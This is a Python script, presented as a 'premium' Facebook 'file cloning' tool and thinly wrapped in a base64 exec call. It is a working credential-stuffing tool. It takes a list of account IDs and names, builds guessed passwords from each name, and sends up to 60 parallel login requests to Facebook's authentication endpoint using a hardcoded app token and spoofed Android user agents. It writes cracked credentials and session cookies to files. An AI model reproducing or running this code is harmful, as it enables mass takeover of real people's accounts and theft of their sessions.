#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: MEHEDI
#______TELEGRAM : https://t.me/lokmanvau
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'#==================[OWNER]==================#
#CODDED BY MEHEDI
#Send by : https://t.me/hacker_lx
#==================[MODULE]==================#
import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor
import requests
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
from io import BytesIO
try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')    
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=65).submit
#==================[PERMISSION]==================#
try:
    os.listdir("/sdcard")
except:
    os.system("clear")
    sys.exit(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m PLEASE GIVE STORAGE PERMISSION ")
#==================[COLOUR]==================#
R = '\033[1;91m'
W = '\033[1;97m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\x1b[38;5;46m'
#==================[LOOP]==================#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[];plist=[]
#==================[UA-BOX]====================#
#==================[FILE-M-1]====================#
def f1():  
    mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F'])
    url1 = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return url1
#==================[FILE-M-2]====================#
def f2():
        url3  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return url3
#==================[FILE-M-3]====================#  
def f3():
    realmi = random.choice(["RMP2107","RMX3770","RMX2176","RMX3939","RMX3868"])
    url4 = "[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+realmi+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    return url4
#==================[FILE-M-4]====================#
def f4():
    poco_models = ['Poco F1', 'Poco X3 NFC', 'Poco M3', 'Poco F2 Pro', 'Poco X4 Pro', 'Poco M4 Pro']
    user_agent = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};' \
                 f'FBBV/{random.randint(1111111, 9999999)};' \
                 f'FBDM/{{density=2.0,width=1080,height=2400}};' \
                 f'FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};' \
                 f'FBCR/Airalo;FBMF/Xiaomi;FBBD/Xiaomi;' \
                 f'FBPN/com.facebook.katana;FBDV/{random.choice(poco_models)};' \
                 f'FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]'
    
    return user_agent
#==================[FUNCTIONS]==================#
def clear():
    os.system("clear")
    print(logo)
def linex():
    print('\033[1;37m=====================================================\x1b[1;97m')
def animation(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def m2():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/11.0.0.77.93;FBBV/61279955;FBDM/{density=2.7,width=1440,height=2560};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920W8;FBSV/8.0;nullFBCA/armeabi-v7a:armeabi;]"
    #-------------Jone TG Code BY KALYAN KING 😁------#
    print("Jone my Teligerm Channel ")
    os.system("xdg-open https://t.me/KGF_TERMUX_TEAM")
logo = f'''
██████╗ ███████╗██████╗      ███████╗ ██████╗ ███╗   ██╗███████╗
██╔══██╗██╔════╝██╔══██╗     ╚══███╔╝██╔═══██╗████╗  ██║██╔════╝
██████╔╝█████╗  ██║  ██║█████╗ ███╔╝ ██║   ██║██╔██╗ ██║█████╗  
██╔══██╗██╔══╝  ██║  ██║╚════╝███╔╝  ██║   ██║██║╚██╗██║██╔══╝  
██║  ██║███████╗██████╔╝     ███████╗╚██████╔╝██║ ╚████║███████╗
╚═╝  ╚═╝╚══════╝╚═════╝      ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
                                                                
\033[1;37m=====================================================\x1b[1;97m
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m AUTHOR {R}>> {G}MEHEDI HASAN 
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m GITHAB {R}>> {G}I-MEHEDI
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TOOLS {R} >> {G}FILE CLONE
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TYPE {R}  >> {G}PREMIUM 
\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m Teligerm {R} >>{G} HACKER LX TEAM / RED-ZONE999
\033[1;37m=====================================================\x1b[1;97m'''
#==================[MENU]==================#
def mmk():
    clear()
    print("\033[1;37m<\033[1;32m1\033[1;37m>\033[1;32m FILE CLONING")
    linex()
    mmkx = input(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m CHOICE{R} >> {G}")
    if mmkx in ['1', '01']:
        mmku()
    else:
        os.system("clear")
        print("\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TOOLS EXITED DONE")
#==================[FILE]==================#
def mmku():
    clear()
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m EXAMPLE {R}  >> {G}/sdcard/test.txt")
    linex()
    file = input(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m FILE PATH {R}  >> {G}')
    
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m WRITE CORRECT PATH')
        time.sleep(1)
        mmku()
    
    clear()
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m METHOD [1]")
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m METHOD [2]")
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m METHOD [3]")
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m METHOD [4]")
    linex()
    mth = input(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m METHOD NO {R}  >> {G}")    
    clear()
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m 30+ AUTO PASSWORD")
    print(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m OWN PASSWORD")
    linex()
    
    psw = input(f"\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m CHOICE {R}  >> {G}")
    
    if psw in ['1', '01']:
       plist.append('first last')
       plist.append('firstlast')
       plist.append('first123')
       plist.append('first1234')
       plist.append('First Last')
       plist.append('57273200')
       plist.append('57575727')
       plist.append('57575727')
       plist.append('first@123')
       plist.append('first017')
       plist.append('@12345@')
       plist.append('@123456@')
       plist.append('@1234567@')
       plist.append('first019')
       plist.append('first018')
       plist.append('first@')
       plist.append('first@@')
       plist.append('last123')
       plist.append('last1234')
       plist.append('last12')
       plist.append('@@first@@')
       plist.append('last12345')
       plist.append('first@@@')
       plist.append('first0')
       plist.append('first1')
    else:
        try:
            clear()
            ps_limit = int(input(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m PASSWORD LIMIT \033[1;32m: \033[1;32m'))
        except ValueError:
            ps_limit = 1
        for i in range(ps_limit):
           plist.append(input(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m PASSWORD NO {i+1} \033[1;32m: \033[1;32m'))
    
    clear()
    cx = input(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m DO YOU WANT TO SHOW CP ACCOUNTS (Y/N)? ').lower()
    if cx in ['y', 'yes']:
        pcp.append('y')
    else:
        pcp.append('n')
    with ThreadPoolExecutor(max_workers=60) as crack_submit:
        clear()
        total_ids = len(fo)
        print(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TOTAL ID    \033[1;32m:   {total_ids}')
        print(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m METHOD      \033[1;31m:   M{mth}')
        linex()
        
        for user in fo:
            ids, names = user.split('|', 1)
            passlist = plist
            if mth == '1':
                crack_submit.submit(graph,ids,names,passlist)
            elif mth == '2':
                crack_submit.submit(graph2,ids,names,passlist)
            elif mth == '3':
                crack_submit.submit(graph3,ids,names,passlist)
            elif mth == '4':
                crack_submit.submit(graph4,ids,names,passlist)   
    print('\033[1;37m')
    print(f'\r\033[1;37m=====================================================\x1b[1;97m')
    print(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
    print(f'\033[1;37m<\033[1;31m❖\033[1;37m>\033[1;32m THE PROCESS HAS COMPLETED')
    print(f'\r\033[1;37m=====================================================\x1b[1;97m')
#==================[M1]==================#
def graph(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [MEHEDI-M1]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(cps)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_MEHEDI": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f1(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\033[1;32m[MEHEDI-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/MEHEDI-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R} <[MEHEDI-CP]>{B} '+ids+f'{G} |{G} '+pas+'\033[1;97m')
                open('/sdcard/MEHEDI-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M2]==================#
def graph2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [MEHEDI-M2]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_MEHEDI": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f2(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\033[1;32m[MEHEDI-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/MEHEDI-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[MEHEDI-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
                open('/sdcard/MEHEDI-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M3]==================#
def graph3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [MEHEDI-M3]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_MEHEDI": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f3(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\033[1;32m[MEHEDI-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/MEHEDI-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[MEHEDI-CP]> '+ids+f'{Y} |{Y} '+pas+'\033[1;97m')
                open('/sdcard/MEHEDI-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[M4]==================#
def graph4(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r [MEHEDI-M4]\033[1;36m [%s]\033[0;37m :::\033[1;32m OK \033[0;37m>>\033[1;32m %s '%(loop,len(oks)));sys.stdout.flush()
    sys.stdout.flush()
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/454.0.0.37.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/588686349;FBCR/Robi;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]'
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data={
            "kids_xudina": str(uuid.uuid4()),
            "format": "json",
            "sha_kids_bokachoda": str(uuid.uuid4()),
            "FUCK_MEHEDI": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d",}
            hedaamr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "User-Agent": f4(),
            "X-FB-Net-HNI": "45204",
            "X-FB-SIM-HNI": "45201",
            "X-FB-Connection-Type": "unknown",
            "Connection": "Keep-Alive",}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=hedaamr,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\033[1;32m[MEHEDI-OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
                print(f"\033[1;32m<[🍪]> {coki}");linex()
                open('/sdcard/MEHEDI-FILE-M4-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B} <[MEHEDI-CP]> '+ids+f' | '+pas+'\033[1;97m')
                open('/sdcard/MEHEDI-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#==================[END]==================#
mmk()'))